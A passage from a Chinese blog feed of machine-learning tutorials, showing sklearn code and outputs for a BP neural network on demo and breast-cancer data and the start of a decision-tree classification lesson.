src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建立 BP 模型, 采用sgd优化器，relu非线性映射函数</span></span><br><span class="line">BP = MLPClassifier(solver=<span class="string">&#x27;sgd&#x27;</span>,activation = <span class="string">&#x27;relu&#x27;</span>,max_iter = <span class="number">500</span>,alpha = <span class="number">1e-3</span>,hidden_layer_sizes = (<span class="number">32</span>,<span class="number">32</span>),random_state = <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 进行模型训练</span></span><br><span class="line"><span class="keyword">with</span> warnings.catch_warnings():</span><br><span class="line">    warnings.filterwarnings(<span class="string">&quot;ignore&quot;</span>, category=ConvergenceWarning,</span><br><span class="line">                            module=<span class="string">&quot;sklearn&quot;</span>)</span><br><span class="line">    BP.fit(train_samples, train_labels)</span><br></pre></td></tr></table></figure><p><strong>Step3: 模型参数查看</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看 BP 模型的参数</span></span><br><span class="line"><span class="built_in">print</span>(BP)</span><br></pre></td></tr></table></figure><pre><code>MLPClassifier(alpha=0.001, hidden_layer_sizes=(32, 32), max_iter=500,              random_state=1, solver='sgd')</code></pre><p><strong>Step4: 数据和模型可视化</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进行模型预测</span></span><br><span class="line">predict_labels = BP.predict(train_samples)</span><br><span class="line"><span class="comment"># 显示预测的散点图</span></span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax = Axes3D(fig, rect=[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>], elev=<span class="number">20</span>, azim=<span class="number">20</span>)</span><br><span class="line">ax.scatter(train_samples[:, <span class="number">0</span>], train_samples[:, <span class="number">1</span>], train_samples[:, <span class="number">2</span>], marker=<span class="string">&#x27;o&#x27;</span>, c=predict_labels)</span><br><span class="line">plt.title(<span class="string">&#x27;Demo Data Predict Map with BP Model&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 显示预测分数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;预测准确率: &#123;:.4f&#125;&quot;</span>.<span class="built_in">format</span>(BP.score(train_samples, train_labels)))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可视化预测数据 </span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;真实类别：&quot;</span>, train_labels[:<span class="number">10</span>])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;预测类别：&quot;</span>, predict_labels[:<span class="number">10</span>])</span><br><span class="line"><span class="comment"># 准确率等报表</span></span><br><span class="line"><span class="built_in">print</span>(classification_report(train_labels, predict_labels))</span><br><span class="line"></span><br><span class="line"><span class="comment"># 计算混淆矩阵</span></span><br><span class="line">classes = [<span class="number">0</span>, <span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">cofusion_mat = confusion_matrix(train_labels, predict_labels, classes) </span><br><span class="line">sns.<span class="built_in">set</span>()</span><br><span class="line">figur, ax = plt.subplots()</span><br><span class="line"><span class="comment"># 画热力图</span></span><br><span class="line">sns.heatmap(cofusion_mat, cmap=<span class="string">&quot;YlGnBu_r&quot;</span>, annot=<span class="literal">True</span>, ax=ax) </span><br><span class="line">ax.set_title(<span class="string">&#x27;confusion matrix&#x27;</span>)  <span class="comment"># 标题</span></span><br><span class="line">ax.set_xticklabels([<span class="string">&#x27;&#x27;</span>] + classes, minor=<span class="literal">True</span>)</span><br><span class="line">ax.set_yticklabels([<span class="string">&#x27;&#x27;</span>] + classes, minor=<span class="literal">True</span>)</span><br><span class="line">ax.set_xlabel(<span class="string">&#x27;predict&#x27;</span>)  <span class="comment"># x轴</span></span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;true&#x27;</span>)  <span class="comment"># y轴</span></span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:5: MatplotlibDeprecationWarning: Axes3D(fig) adding itself to the figure is deprecated since 3.4. Pass the keyword argument auto_add_to_figure=False and use fig.add_axes(ax) to suppress this warning. The default value of auto_add_to_figure will change to False in mpl3.5 and True values will no longer work in 3.6.  This is consistent with other Axes classes.  &quot;&quot;&quot;c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\sklearn\utils\validation.py:72: FutureWarning: Pass labels=[0, 1, 2, 3] as keyword args. From version 1.0 (renaming of 0.25) passing these as positional arguments will result in an error  &quot;will result in an error&quot;, FutureWarning)c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:26: UserWarning: FixedFormatter should only be used together with FixedLocatorc:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:27: UserWarning: FixedFormatter should only be used together with FixedLocator预测准确率: 0.9950真实类别： [0 4 2 2 3 2 3 0 1 0]预测类别： [0 4 2 2 3 2 3 0 1 0]              precision    recall  f1-score   support           0       0.98      0.99      0.99       198           1       1.00      0.99      0.99       203           2       1.00      1.00      1.00       200           3       0.99      1.00      1.00       199           4       0.99      0.99      0.99       200    accuracy                           0.99      1000   macro avg       0.99      1.00      0.99      1000weighted avg       1.00      0.99      1.00      1000</code></pre><p>​</p><p>​<br><img "" class="lazyload placeholder" data-original="output_8_2.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><p><img "" class="lazyload placeholder" data-original="output_8_3.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><p><strong>Step5: 模型预测</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进行新的测试数据测试</span></span><br><span class="line">test_sample = np.array([[-<span class="number">1</span>, <span class="number">0.1</span>, <span class="number">0.1</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;test_sample&#125;</span> 类别是: &quot;</span>, BP.predict(test_sample))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;test_sample&#125;</span> 类别概率分别是: &quot;</span>, BP.predict_proba(test_sample))</span><br><span class="line"></span><br><span class="line">test_sample = np.array([[-<span class="number">1.2</span>, <span class="number">10</span>, -<span class="number">91</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;test_sample&#125;</span> 类别是: &quot;</span>, BP.predict(test_sample))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;test_sample&#125;</span> 类别概率分别是: &quot;</span>, BP.predict_proba(test_sample))</span><br><span class="line"></span><br><span class="line">test_sample = np.array([[-<span class="number">12</span>, -<span class="number">0.1</span>, -<span class="number">0.1</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;test_sample&#125;</span> 类别是: &quot;</span>, BP.predict(test_sample))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;test_sample&#125;</span> 类别概率分别是: &quot;</span>, BP.predict_proba(test_sample))</span><br><span class="line"></span><br><span class="line">test_sample = np.array([[<span class="number">100</span>, -<span class="number">90.1</span>, -<span class="number">9.1</span>]])</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;test_sample&#125;</span> 类别是: &quot;</span>, BP.predict(test_sample))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">f&quot;<span class="subst">&#123;test_sample&#125;</span> 类别概率分别是: &quot;</span>, BP.predict_proba(test_sample))</span><br></pre></td></tr></table></figure><pre><code>[[-1.   0.1  0.1]] 类别是:  [4][[-1.   0.1  0.1]] 类别概率分别是:  [[0.08380116 0.1912275  0.17608601 0.16488309 0.38400224]][[ -1.2  10.  -91. ]] 类别是:  [1][[ -1.2  10.  -91. ]] 类别概率分别是:  [[3.37231505e-30 1.00000000e+00 4.24566351e-51 1.92771500e-57  5.16916174e-17]][[-12.   -0.1  -0.1]] 类别是:  [4][[-12.   -0.1  -0.1]] 类别概率分别是:  [[1.42696980e-06 5.86057194e-05 2.99819240e-05 3.03896335e-05  9.99879596e-01]][[100.  -90.1  -9.1]] 类别是:  [2][[100.  -90.1  -9.1]] 类别概率分别是:  [[2.45024178e-02 8.44965777e-67 9.75497582e-01 1.41511057e-66  4.23516105e-50]]</code></pre><h4 id="part-2-基于bp神经网络的乳腺癌分类实践"><a class="markdownIt-Anchor" href="#part-2-基于bp神经网络的乳腺癌分类实践">#</a> Part 2 基于 BP 神经网络的乳腺癌分类实践</h4><p><strong>Step1: 库函数导入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入乳腺癌数据集</span></span><br><span class="line"><span class="keyword">from</span> sklearn.datasets <span class="keyword">import</span> load_breast_cancer</span><br><span class="line"><span class="comment"># 导入BP模型</span></span><br><span class="line"><span class="keyword">from</span> sklearn.neural_network <span class="keyword">import</span> MLPClassifier</span><br><span class="line"><span class="comment"># 导入训练集分割方法</span></span><br><span class="line"><span class="keyword">from</span> sklearn.model_selection <span class="keyword">import</span> train_test_split </span><br><span class="line"><span class="comment"># 导入预测指标计算函数和混淆矩阵计算函数</span></span><br><span class="line"><span class="keyword">from</span> sklearn.metrics <span class="keyword">import</span> classification_report, confusion_matrix</span><br><span class="line"><span class="comment"># 导入绘图包</span></span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"><span class="keyword">import</span> matplotlib</span><br></pre></td></tr></table></figure><p><strong>Step2: 数据读取 / 载入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 导入乳腺癌数据集</span></span><br><span class="line">cancer = load_breast_cancer()</span><br></pre></td></tr></table></figure><p><strong>Step3: 数据信息简单查看与可视化</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 查看数据集信息</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;breast_cancer数据集的长度为：&#x27;</span>,<span class="built_in">len</span>(cancer))</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;breast_cancer数据集的类型为：&#x27;</span>,<span class="built_in">type</span>(cancer))</span><br><span class="line"><span class="comment"># 分割数据为训练集和测试集</span></span><br><span class="line">cancer_data = cancer[<span class="string">&#x27;data&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cancer_data数据维度为：&#x27;</span>,cancer_data.shape)</span><br><span class="line">cancer_target = cancer[<span class="string">&#x27;target&#x27;</span>]</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;cancer_target标签维度为：&#x27;</span>,cancer_target.shape)</span><br><span class="line">cancer_names = cancer[<span class="string">&#x27;feature_names&#x27;</span>]</span><br><span class="line">cancer_desc = cancer[<span class="string">&#x27;DESCR&#x27;</span>]</span><br><span class="line"><span class="comment">#分为训练集与测试集</span></span><br><span class="line">cancer_data_train,cancer_data_test = train_test_split(cancer_data,test_size=<span class="number">0.2</span>,random_state=<span class="number">42</span>)<span class="comment">#训练集</span></span><br><span class="line">cancer_target_train,cancer_target_test = train_test_split(cancer_target,test_size=<span class="number">0.2</span>,random_state=<span class="number">42</span>)<span class="comment">#测试集</span></span><br></pre></td></tr></table></figure><pre><code>breast_cancer数据集的长度为： 7breast_cancer数据集的类型为： &lt;class 'sklearn.utils.Bunch'&gt;cancer_data数据维度为： (569, 30)cancer_target标签维度为： (569,)</code></pre><p><strong>Step4: 利用 BP 神经网络在乳腺癌数据上进行训练和预测</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 建立 BP 模型, 采用Adam优化器，relu非线性映射函数</span></span><br><span class="line">BP = MLPClassifier(solver=<span class="string">&#x27;adam&#x27;</span>,activation = <span class="string">&#x27;relu&#x27;</span>,max_iter = <span class="number">1000</span>,alpha = <span class="number">1e-3</span>,hidden_layer_sizes = (<span class="number">64</span>,<span class="number">32</span>, <span class="number">32</span>),random_state = <span class="number">1</span>)</span><br><span class="line"><span class="comment"># 进行模型训练</span></span><br><span class="line">BP.fit(cancer_data_train, cancer_target_train)</span><br></pre></td></tr></table></figure><pre><code>MLPClassifier(alpha=0.001, hidden_layer_sizes=(64, 32, 32), max_iter=1000,              random_state=1)</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进行模型预测</span></span><br><span class="line">predict_train_labels = BP.predict(cancer_data_train)</span><br><span class="line"><span class="comment"># 可视化真实数据</span></span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax = Axes3D(fig, rect=[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>], elev=<span class="number">20</span>, azim=<span class="number">20</span>) </span><br><span class="line">ax.scatter(cancer_data_train[:, <span class="number">0</span>], cancer_data_train[:, <span class="number">1</span>], cancer_data_train[:, <span class="number">2</span>], marker=<span class="string">&#x27;o&#x27;</span>, c=cancer_target_train)</span><br><span class="line">plt.title(<span class="string">&#x27;True Label Map&#x27;</span>)</span><br><span class="line">plt.show()</span><br><span class="line"><span class="comment"># 可视化预测数据</span></span><br><span class="line">fig = plt.figure()</span><br><span class="line">ax = Axes3D(fig, rect=[<span class="number">0</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">1</span>], elev=<span class="number">20</span>, azim=<span class="number">20</span>) </span><br><span class="line">ax.scatter(cancer_data_train[:, <span class="number">0</span>], cancer_data_train[:, <span class="number">1</span>], cancer_data_train[:, <span class="number">2</span>], marker=<span class="string">&#x27;o&#x27;</span>, c=predict_train_labels)</span><br><span class="line">plt.title(<span class="string">&#x27;Cancer with BP Model&#x27;</span>)</span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><pre><code>c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:5: MatplotlibDeprecationWarning: Axes3D(fig) adding itself to the figure is deprecated since 3.4. Pass the keyword argument auto_add_to_figure=False and use fig.add_axes(ax) to suppress this warning. The default value of auto_add_to_figure will change to False in mpl3.5 and True values will no longer work in 3.6.  This is consistent with other Axes classes.  &quot;&quot;&quot;</code></pre><p><img "" class="lazyload placeholder" data-original="output_19_1.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><pre><code>c:\users\administrator\appdata\local\programs\python\python37\lib\site-packages\ipykernel_launcher.py:11: MatplotlibDeprecationWarning: Axes3D(fig) adding itself to the figure is deprecated since 3.4. Pass the keyword argument auto_add_to_figure=False and use fig.add_axes(ax) to suppress this warning. The default value of auto_add_to_figure will change to False in mpl3.5 and True values will no longer work in 3.6.  This is consistent with other Axes classes.  # This is added back by InteractiveShellApp.init_path()</code></pre><p><img "" class="lazyload placeholder" data-original="output_19_3.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 显示预测分数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;预测准确率: &#123;:.4f&#125;&quot;</span>.<span class="built_in">format</span>(BP.score(cancer_data_test, cancer_target_test)))</span><br><span class="line"><span class="comment"># 进行测试集数据的类别预测</span></span><br><span class="line">predict_test_labels = BP.predict(cancer_data_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;测试集的真实标签:\n&quot;</span>, cancer_target_test)</span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;测试集的预测标签:\n&quot;</span>, predict_test_labels)</span><br></pre></td></tr></table></figure><pre><code>预测准确率: 0.9474测试集的真实标签: [1 0 0 1 1 0 0 0 1 1 1 0 1 0 1 0 1 1 1 0 0 1 0 1 1 1 1 1 1 0 1 1 1 1 1 1 0 1 0 1 1 0 1 1 1 1 1 1 1 1 0 0 1 1 1 1 1 0 0 1 1 0 0 1 1 1 0 0 1 1 0 0 1 0 1 1 1 0 1 1 0 1 0 0 0 0 0 0 1 1 1 1 1 1 1 1 0 0 1 0 0 1 0 0 1 1 1 0 1 1 0 1 1 0]测试集的预测标签: [1 0 0 1 1 0 0 0 1 1 1 0 1 0 1 0 1 1 1 0 1 1 0 1 1 1 1 1 1 0 1 1 1 1 1 1 0 1 0 1 1 0 1 1 1 1 1 1 1 1 0 0 1 1 1 1 1 0 1 1 1 0 0 1 1 1 0 0 1 1 0 0 1 1 1 1 1 1 1 1 0 1 1 0 0 1 0 0 1 1 1 1 1 1 1 1 0 0 1 0 0 1 0 0 1 1 1 0 1 1 0 1 1 0]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 进行预测结果指标统计 统计每一类别的预测准确率、召回率、F1分数</span></span><br><span class="line"><span class="built_in">print</span>(classification_report(cancer_target_test, predict_test_labels))</span><br></pre></td></tr></table></figure><pre><code>              precision    recall  f1-score   support           0       1.00      0.86      0.92        43           1       0.92      1.00      0.96        71    accuracy                           0.95       114   macro avg       0.96      0.93      0.94       114weighted avg       0.95      0.95      0.95       114</code></pre><p>​</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 计算混淆矩阵</span></span><br><span class="line">confusion_mat = confusion_matrix(cancer_target_test, predict_test_labels)</span><br><span class="line"><span class="comment"># 打混淆矩阵</span></span><br><span class="line"><span class="built_in">print</span>(confusion_mat)</span><br></pre></td></tr></table></figure><pre><code>[[37  6] [ 0 71]]</code></pre><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 将混淆矩阵以热力图的防线显示</span></span><br><span class="line">sns.<span class="built_in">set</span>()</span><br><span class="line">figure, ax = plt.subplots()</span><br><span class="line"><span class="comment"># 画热力图</span></span><br><span class="line">sns.heatmap(confusion_mat, cmap=<span class="string">&quot;YlGnBu_r&quot;</span>, annot=<span class="literal">True</span>, ax=ax)  </span><br><span class="line"><span class="comment"># 标题 </span></span><br><span class="line">ax.set_title(<span class="string">&#x27;confusion matrix&#x27;</span>)</span><br><span class="line"><span class="comment"># x轴为预测类别</span></span><br><span class="line">ax.set_xlabel(<span class="string">&#x27;predict&#x27;</span>)  </span><br><span class="line"><span class="comment"># y轴实际类别</span></span><br><span class="line">ax.set_ylabel(<span class="string">&#x27;true&#x27;</span>)  </span><br><span class="line">plt.show()</span><br></pre></td></tr></table></figure><p>​<br><img "" class="lazyload placeholder" data-original="output_23_0.png" src="https://img10.360buyimg.com/ddimg/jfs/t1/157667/29/9156/134350/603c6445Ebbc9cabe/41219c5d36d45072.gif" alt="png"><br>​</p><h2 id="5-算法重要知识点"><a class="markdownIt-Anchor" href="#5-算法重要知识点">#</a> 5. 算法重要知识点</h2><p>BP 神经网络模型要点在于数据的前向传播和误差反向传播，来对参数进行更新，使得损失最小化。 误差反向传播算法简称反向传播算法（即 BP 算法）。使用反向传播算法的多层感知器又称为 BP 神经网络。BP 算法是一个迭代算法，它的基本思想为：</p><ol><li>先计算每一层的状态和激活值，直到最后一层（即信号是前向传播的）；</li><li>计算每一层的误差，误差的计算过程是从最后一层向前推进的（这就是反向传播算法名字的由来）；</li><li>更新参数（目标是误差变小）。迭代前面两个步骤，直到满足停止准则（比如相邻两次迭代的误差的差别很小）。</li></ol><p>在这个过程，函数的导数链式法则求导很重要，需要手动推导 BP 神经网络模型的梯度反向传播过程，熟练掌握链式法则进行求导，对参数进行更新。</p>]]></content>
      
      
      <categories>
          
          <category> 天池机器学习入门 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 机器学习 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>基于决策树的分类预测</title>
      <link href="/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8E%E5%86%B3%E7%AD%96%E6%A0%91%E7%9A%84%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/"/>
      <url>/2021/11/08/%E6%9C%BA%E5%99%A8%E5%AD%A6%E4%B9%A0/%E5%A4%A9%E6%B1%A0/%E5%9F%BA%E4%BA%8E%E5%86%B3%E7%AD%96%E6%A0%91%E7%9A%84%E5%88%86%E7%B1%BB%E9%A2%84%E6%B5%8B/</url>
      
        <content type="html"><![CDATA[<h1 id="1-逻决策树的介绍和应用"><a class="markdownIt-Anchor" href="#1-逻决策树的介绍和应用">#</a> 1 逻决策树的介绍和应用</h1><h2 id="11-决策树的介绍"><a class="markdownIt-Anchor" href="#11-决策树的介绍">#</a> 1.1 决策树的介绍</h2><p>决策树是一种常见的分类模型，在金融风控、医疗辅助诊断等诸多行业具有较为广泛的应用。决策树的核心思想是基于树结构对数据进行划分，这种思想是人类处理问题时的本能方法。例如在婚恋市场中，女方通常会先询问男方是否有房产，如果有房产再了解是否有车产，如果有车产再看是否有稳定工作…… 最后得出是否要深入了解的判断。</p><p>决策树的主要优点：</p><ul><li>具有很好的解释性，模型可以生成可以理解的规则。</li><li>可以发现特征的重要程度。</li><li>模型的计算复杂度较低。</li></ul><p>决策树的主要缺点：</p><ul><li>模型容易过拟合，需要采用减枝技术处理。</li><li>不能很好利用连续型特征。</li><li>预测能力有限，无法达到其他强监督模型效果。</li><li>方差较高，数据分布的轻微改变很容易造成树结构完全不同。</li></ul><h2 id="12-决策树的应用"><a class="markdownIt-Anchor" href="#12-决策树的应用">#</a> 1.2 决策树的应用</h2><p>由于决策树模型中自变量与因变量的非线性关系以及决策树简单的计算方法，使得它成为集成学习中最为广泛使用的基模型。梯度提升树 (GBDT)，XGBoost 以及 LightGBM 等先进的集成模型都采用了决策树作为基模型，在广告计算、CTR 预估、金融风控等领域大放异彩，成为当今与神经网络相提并论的复杂模型，更是数据挖掘比赛中的常客。在新的研究中，南京大学周志华教授提出一种多粒度级联森林模型，创造了一种全新的基于决策树的深度集成方法，为我们提供了决策树发展的另一种可能。</p><p>同时决策树在一些明确需要可解释性或者提取分类规则的场景中被广泛应用，而其他机器学习模型在这一点很难做到。例如在医疗辅助系统中，为了方便专业人员发现错误，常常将决策树算法用于辅助病症检测。例如在一个预测哮喘患者的模型中，医生发现测试的许多高级模型的效果非常差。在他们运行了一个决策树模型后发现，算法认为剧烈咳嗽的病人患哮喘的风险很小。但医生非常清楚剧烈咳嗽一般都会被立刻检查治疗，这意味着患有剧烈咳嗽的哮喘病人都会马上得到收治。用于建模的数据认为这类病人风险很小，是因为所有这类病人都得到了及时治疗，所以极少有人在此之后患病或死亡。</p><h1 id="2-实验室手册"><a class="markdownIt-Anchor" href="#2-实验室手册">#</a> 2. 实验室手册</h1><h2 id="21-学习目标"><a class="markdownIt-Anchor" href="#21-学习目标">#</a> 2.1 学习目标</h2><p>了解 决策树 的理论知识<br>掌握 决策树 的 sklearn 函数调用并将其运用在企鹅数据集的预测中</p><h2 id="22-代码流程"><a class="markdownIt-Anchor" href="#22-代码流程">#</a> 2.2 代码流程</h2><h4 id="part1-demo实践"><a class="markdownIt-Anchor" href="#part1-demo实践">#</a> Part1 Demo 实践</h4><ul><li>Step1: 库函数导入</li><li>Step2: 模型训练</li><li>Step3: 数据和模型可视化</li><li>Step4: 模型预测</li></ul><h4 id="part2-基于企鹅penguins数据集的决策树分类实践"><a class="markdownIt-Anchor" href="#part2-基于企鹅penguins数据集的决策树分类实践">#</a> Part2 基于企鹅（penguins）数据集的决策树分类实践</h4><ul><li>Step1: 库函数导入</li><li>Step2: 数据读取 / 载入</li><li>Step3: 数据信息简单查看</li><li>Step4: 可视化描述</li><li>Step5: 利用 决策树模型 在二分类上 进行训练和预测</li><li>Step6: 利用 决策树模型 在三分类 (多分类) 上 进行训练和预测</li></ul><h2 id="23-算法实战"><a class="markdownIt-Anchor" href="#23-算法实战">#</a> 2.3 算法实战</h2><h3 id="231-demo实践"><a class="markdownIt-Anchor" href="#231-demo实践">#</a> 2.3.1 Demo 实践</h3><p><strong>Step1: 库函数导入</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##  基础函数库</span></span><br><span class="line"><span class="keyword">import</span> numpy <span class="keyword">as</span> np </span><br><span class="line"></span><br><span class="line"><span class="comment">## 导入画图库</span></span><br><span class="line"><span class="keyword">import</span> matplotlib.pyplot <span class="keyword">as</span> plt</span><br><span class="line"><span class="keyword">import</span> seaborn <span class="keyword">as</span> sns</span><br><span class="line"></span><br><span class="line"><span class="comment">## 导入决策树模型函数</span></span><br><span class="line"><span class="keyword">from</span> sklearn.tree <span class="keyword">import</span> DecisionTreeClassifier</span><br><span class="line"><span class="keyword">from</span> sklearn <span class="keyword">import</span> tree</span><br></pre></td></tr></table></figure><p><strong>Step2: 模型训练</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">##Demo演示LogisticRegression分类</span></span><br><span class="line"></span><br><span class="line"><span class="comment">## 构造数据集</span></span><br><span class="line">x_fearures = np.array([[-<span class="number">1</span>, -<span class="number">2</span>], [-<span class="number">2</span>, -<span class="number">1</span>], [-<span class="number">3</span>, -<span class="number">2</span>], [<span class="number">1</span>, <span class="number">3</span>], [<span class="number">2</span>, <span class="number">1</span>], [<span class="number">3</span>, <span class="number">2</span>]])</span><br><span class="line">y_label = np.array([<span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>, <span class="number">0</span>, <span class="number">1</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment">## 调用决策树回归模型</span></span><br><span class="line">tree_clf = DecisionTreeClassifier()</span><br><span class="line"></span><br><span class="line"><span class="comment">## 调用决策树模型拟合构造的数据集</span></span><br><span class="line">tree_clf = tree_clf.fit(x_fearures, y_label)</span><br></pre></td></tr></table></figure><p><strong>Step3: 数据和模型可视化</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span 